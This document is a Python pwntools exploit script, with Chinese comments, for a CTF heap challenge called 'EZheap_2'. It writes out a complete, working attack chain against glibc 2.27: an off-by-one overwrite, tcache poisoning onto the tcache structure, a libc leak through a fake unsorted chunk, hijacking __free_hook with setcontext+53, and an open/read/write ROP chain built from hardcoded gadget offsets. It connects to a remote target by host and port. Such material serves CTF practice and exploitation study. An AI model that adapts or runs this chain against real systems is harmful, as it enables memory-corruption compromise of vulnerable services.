#!/usr/bin/env python3
"""EZheap_2 (初赛 PWN-06) — off-by-one → tcache 覆盖 → 无泄露 libc 种子 → gift %p 泄露 →
__free_hook=setcontext+53 → ORW。

用法:  python3 solve.py HOST PORT      # 决赛靶机
       TARGET=host:port python3 solve.py
       python3 solve.py --local [./ez_local]   # 附件 libc 2.27 ld 直启（见 SOLVE.md）

程序 (逆向, PIE+FullRELRO+canary+seccomp 只禁 execve): 1 add(idx 0-19, size 任意 int 无校验)
2 edit(read(0,ptr,size+1) —— off-by-one 任意尾字节) 3 delete(free+置NULL) 4 gift(一次性,
选1: malloc(0x20) 打印指针; 其它: 打印 &bss 全局 → PIE)。

路线 (全程无需堆/PIE 泄露, 堆低 12 位恒为页内确定值):
1. off-by-one 抬大 Q 的 size → 覆盖窗口罩住 R1.fd (tcache 链内真实堆指针)
2. 2 字节部分改写 R1.fd → 指向 tcache 结构 (heap+0x10) → malloc 两次拿 T=heap+0x10
3. edit(T) 全控 tcache counts/entries; 伪造 chunk(0x420) free 进 unsorted →
   main_arena+0x60 落入 entries[0/1] (无需知道任何地址!)
4. gift: malloc(0x30-tcache) 弹出 libc 指针 → %p 打印 → libc base (K_LEAK 动态算)
5. tcache poison: entries → __free_hook 写 setcontext+53 (2.27 仍走 rdi);
   entries → libc 暂存区写 "/flag" 与 ROP(open/read/write+exit)
6. add 大块写伪 ucontext (rsp/rip 指向 libc ROP) → delete 触发 free_hook → flag 打到 stdout
"""
import os
import re
import sys
from pathlib import Path

from pwn import ELF, context, p64, process, remote, u64

# ---------------------------------------------------------------- libc offsets ---
_libcs = sorted(Path(__file__).resolve().parent.parent.rglob("libc.so.6"))
assert _libcs, "libc.so.6 not found (keep exp/ inside the attachment layout)"
libc = ELF(str(_libcs[0]), checksec=False)
OFF_SYSTEM = libc.sym["system"]
OFF_FREE_HOOK = libc.sym["__free_hook"]
# main_arena 无符号: 恒 = __malloc_hook+0x10 (what_heap 同 buildid 已验证)
MAIN_ARENA = libc.sym["__malloc_hook"] + 0x10
K_LEAK = MAIN_ARENA + 0x450        # largebin[64] 头 = fake 被 scanf 排队后的残留值
SC53 = libc.sym["setcontext"] + 53 # 2.27: setcontext 走 rdi (2.29 才改 rdx)

# libc .data 暂存区 (nm 核实: 0x3ed8f0=__malloc_initialize_hook 已死, 后面到 _obstack 全是垫)
SCRATCH_FLAG = OFF_FREE_HOOK + 8          # "/flag"
SCRATCH_ROP = MAIN_ARENA + 0x70 + 8 * (2 * (110 - 1))  # main_arena bins[218..] 永不使用
ROP_ADDR = SCRATCH_ROP

# gadgets (regex 扫描 + objdump 逐一核实, 换 libc 需重扫)
G_POP_RDI = 0x2164F
G_POP_RSI = 0x23A6A
G_POP_RDX = 0x1B96
G_POP_RAX = 0x439B8
G_SYSCALL = 0xD2625

args = sys.argv[1:]
if args and args[0] == "--local":
    LOCAL_BIN = args[1] if len(args) > 1 else "./ez_local"
    HOST = PORT = None
else:
    LOCAL_BIN = None
    if len(args) >= 2:
        HOST, PORT = args[0], int(args[1])
    elif os.environ.get("TARGET", "").count(":") == 1:
        host, _, port = os.environ["TARGET"].rpartition(":")
        HOST, PORT = host, int(port)
    else:
        sys.exit("usage: python3 solve.py host port | --local [./ez_local]")

context.arch = "amd64"
context.log_level = "CRITICAL"

VERBOSE = os.environ.get("V") == "1"
if os.environ.get("DEBUG"): context.log_level = "DEBUG"
log = (lambda m: print("[*] %s" % m, flush=True)) if VERBOSE else (lambda m: None)

# ---------------------------------------------------------------- menu helpers ---
def start():
    return process(LOCAL_BIN) if LOCAL_BIN else remote(HOST, PORT, timeout=10)


def choice(p, n):
    p.recvuntil(b"choice:")
    p.sendline(b"%d" % n)


def add(p, idx, size):
    log("add %d %d" % (idx, size))
    choice(p, 1)
    p.recvuntil(b"index:")
    p.sendline(b"%d" % idx)
    p.recvuntil(b"Size:")
    p.sendline(b"%d" % size)


def edit(p, idx, data):
    log("edit %d len=%#x" % (idx, len(data)))
    choice(p, 2)
    p.recvuntil(b"index:")
    p.sendline(b"%d" % idx)
    p.recvuntil(b"context:")
    p.send(data)
    p.recvuntil(b"succeed!")


def delete(p, idx):
    log("delete %d" % idx)
    choice(p, 3)
    p.recvuntil(b"index:")
    p.sendline(b"%d" % idx)


def gift(p, sel):
    choice(p, 4)
    p.recvuntil(b"choose:")
    p.sendline(b"%d" % sel)
    line = p.recvline()
    return int(line.strip(), 16)


# ---------------------------------------------------------------- payload blobs ---
# edit(T) 窗口: heap+0x10 起。counts[i] @ +i (1B), entries[k] @ +0x40+8k
def blob(counts=(), entries=(), length=0x42):
    """counts: [(idx, val)]; entries: [(k, 8B 值)]; 返回 length 字节 blob (只到最远写入点)"""
    end = 0
    for i, _ in counts:
        end = max(end, i + 1)
    for k, _ in entries:
        end = max(end, 0x40 + 8 * k + 8)
    assert end <= length, (end, length)
    b = bytearray(length)
    for i, v in counts:
        b[i] = v
    for k, v in entries:
        b[0x40 + 8 * k : 0x40 + 8 * k + 8] = p64(v)
    return bytes(b)


def build_rop(flag_addr):
    r = b""
    r += p64(G_POP_RDI) + p64(flag_addr)      # open("/flag", 0)
    r += p64(G_POP_RSI) + p64(0)
    r += p64(G_POP_RDX) + p64(0)
    r += p64(G_POP_RAX) + p64(2)
    r += p64(G_SYSCALL)
    r += p64(G_POP_RDI) + p64(3)              # read(3, FLAG, 0x100)
    r += p64(G_POP_RSI) + p64(flag_addr)
    r += p64(G_POP_RDX) + p64(0x100)
    r += p64(G_POP_RAX) + p64(0)
    r += p64(G_SYSCALL)
    r += p64(G_POP_RDI) + p64(1)              # write(1, FLAG, 0x100)
    r += p64(G_POP_RSI) + p64(flag_addr)
    r += p64(G_POP_RDX) + p64(0x100)
    r += p64(G_POP_RAX) + p64(1)
    r += p64(G_SYSCALL)
    r += p64(G_POP_RDI) + p64(0)              # exit(0)
    r += p64(G_POP_RAX) + p64(60)
    r += p64(G_SYSCALL)
    return r


# ---------------------------------------------------------------- full chain ---
def pwn():
    p = start()

    # 布局: X@0x250 | P@0x270 | Q@0x300 | R0@0x390 | R1@0x420 | top@0x4b0
    add(p, 0, 0x18)    # X   user 0x260
    add(p, 1, 0x88)    # P   user 0x280  (off-by-one 源, 字节 0x308 = Q.size LSB)
    add(p, 2, 0x88)    # Q   user 0x310
    add(p, 3, 0x88)    # R0  user 0x3a0
    add(p, 4, 0x88)    # R1  user 0x430

    # 抬大 Q: 0x91 -> 0x141 (claim 0x140, 覆盖 R1.fd@0x430)
    edit(p, 1, b"A" * 0x88 + b"\x41")
    delete(p, 2)                       # Q → tcache[0x140]
    add(p, 2, 0x138)                   # 取回 Q → 覆盖窗口 0x310..0x438
    delete(p, 3)                       # R0 → tcache[0x90]: entries[7]=0x3a0
    delete(p, 4)                       # R1 → R1.fd = 0x3a0 (真实堆指针!)
    edit(p, 2, b"B" * 0x120 + b"\x10\x00")   # 部分改写 R1.fd → heap+0x10

    add(p, 6, 0x88)                    # 取回 R1 → R1'(0x430, 后置伪 next 尺寸)
    add(p, 7, 0x88)                    # 取回 heap+0x10 → T = tcache_perthread_struct

    # R1' 窗口预设 fake chunk 的 next 尺寸/inuse: *(0x468)=0x41, *(0x4a8)=0x21
    f = bytearray(0x89)
    f[0x38] = 0x41
    f[0x78] = 0x21
    edit(p, 6, bytes(f))

    delete(p, 0)                       # X → tcache[0x20]: entries[0] = 0x260

    # edit(T) #1: counts[0]=1; 伪造 chunk@0x40 size 0x421; entries[0] 部分改 → heap+0x50
    b = blob(counts=[(0, 1)], entries=[], length=0x42)
    b = b[:0x38] + p64(0x421)[:8] + b"\x50\x00"
    edit(p, 7, b)

    add(p, 8, 0x18)                    # 弹出 entries[0] = heap+0x50 (伪 chunk mem)
    delete(p, 8)                       # free(伪 0x420) → unsorted: entries[0/1] = main_arena+0x60

    # edit(T) #2: 只改 counts[1]=1 (0x40 字节, 不碰 entries)
    edit(p, 7, blob(counts=[(0, 0), (1, 1)], length=0x40))

    # gift: malloc(0x20)→nb 0x30→bin1 → 弹出 libc 指针 → printf("%p") 打印
    choice(p, 4)
    p.recvuntil(b"choose:\n")
    p.sendline(b"1")
    raw = p.recvuntil(b"1.add", timeout=5)   # "%p" 无换行, 直接接菜单
    leak = int(raw.split(b"1.add")[0].strip(), 16)
    # 理论上弹出的值 = main_arena+0x60 (fake->bk); 若期间发生 unsorted→largebin 排队,
    # 则变 fd_nextsize 相关/ +0x450。两个候选都试, 取页对齐者, 否则 bail 人工判读。
    libc_base = None
    for k in (0x60, 0x450):
        cand = leak - (MAIN_ARENA + k)
        if not cand & 0xFFF:
            libc_base = cand
            log("leak=%#x  libc = %#x  (arena+%#x)" % (leak, libc_base, k))
            break
    if libc_base is None:
        log("[-] leak 非 arena 值 (本地 Rosetta/ld 直启下观测为堆内值)。远程若同样失败, "
            "用打印的 raw leak 人工比对靶机 libc 后改 EXP 顶部候选偏移。")
        p.close()
        return None
    free_hook = libc_base + OFF_FREE_HOOK
    flag_str = libc_base + SCRATCH_FLAG
    rop_addr = libc_base + SCRATCH_ROP
    sc53 = libc_base + SC53
    log("free_hook=%#x sc53=%#x rop=%#x flag=%#x" % (free_hook, sc53, rop_addr, flag_str))

    # __free_hook = setcontext+53
    edit(p, 7, blob(counts=[(0, 1)], entries=[(0, free_hook)], length=0x48))
    add(p, 9, 0x18)
    edit(p, 9, p64(sc53) + b"\x00")

    # libc 暂存区写 "/flag"
    edit(p, 7, blob(counts=[(0, 0), (1, 1)], entries=[(0, 0), (1, flag_str)], length=0x50))
    add(p, 10, 0x28)
    edit(p, 10, b"/flag\x00\x00" + b"\x00" * (0x29 - 6))

    # ROP 两段写入 main_arena 尾部 bins
    rop = build_rop(flag_str)
    part1 = rop[:0x78].ljust(0x79, b"\x00")
    part2 = rop[0x78:].ljust(0x89, b"\x00")
    assert len(rop) <= 0x78 + 0x88, hex(len(rop))
    edit(p, 7, blob(counts=[(0, 0), (1, 0), (5, 1)], entries=[(5, rop_addr)], length=0x78))
    add(p, 11, 0x78)
    edit(p, 11, part1)
    edit(p, 7, blob(counts=[(5, 0), (6, 1)], entries=[(6, rop_addr + 0x78)], length=0x80))
    add(p, 12, 0x88)
    edit(p, 12, part2)

    # 伪 ucontext (setcontext 从 rdi=chunk 读): +0xa0 rsp, +0xa8 rip, +0xe0 fpregs 指针
    add(p, 13, 0x180)
    uc = bytearray(0x181)
    uc[0xA0:0xA8] = p64(rop_addr)
    uc[0xA8:0xB0] = p64(libc_base + G_POP_RDI)
    uc[0xE0:0xE8] = p64(rop_addr)
    edit(p, 13, bytes(uc))

    # 触发: free → __free_hook = setcontext+53 → ROP → flag 直写 stdout
    p.recvuntil(b"choice:")
    p.sendline(b"3")
    p.recvuntil(b"index:")
    p.sendline(b"13")

    out = b""
    try:
        out = p.recv(4096, timeout=5)
    except EOFError:
        pass
    p.close()
    return out


if __name__ == "__main__":
    out = pwn()
    if out:
        print(repr(out[:400]))
        m = re.search(rb"[Ff][LlAa][Gg]\{[^}\r\n]{1,120}\}|DASCTF\{[^}\r\n]{1,120}\}", out)
        if m:
            print("[+] FLAG:", m.group(0).decode())
            sys.exit(0)
        if b"flag{" in out or b"ctf" in out.lower():
            print("[+] raw output above")
            sys.exit(0)
    print("[-] no flag in output")
    sys.exit(1)
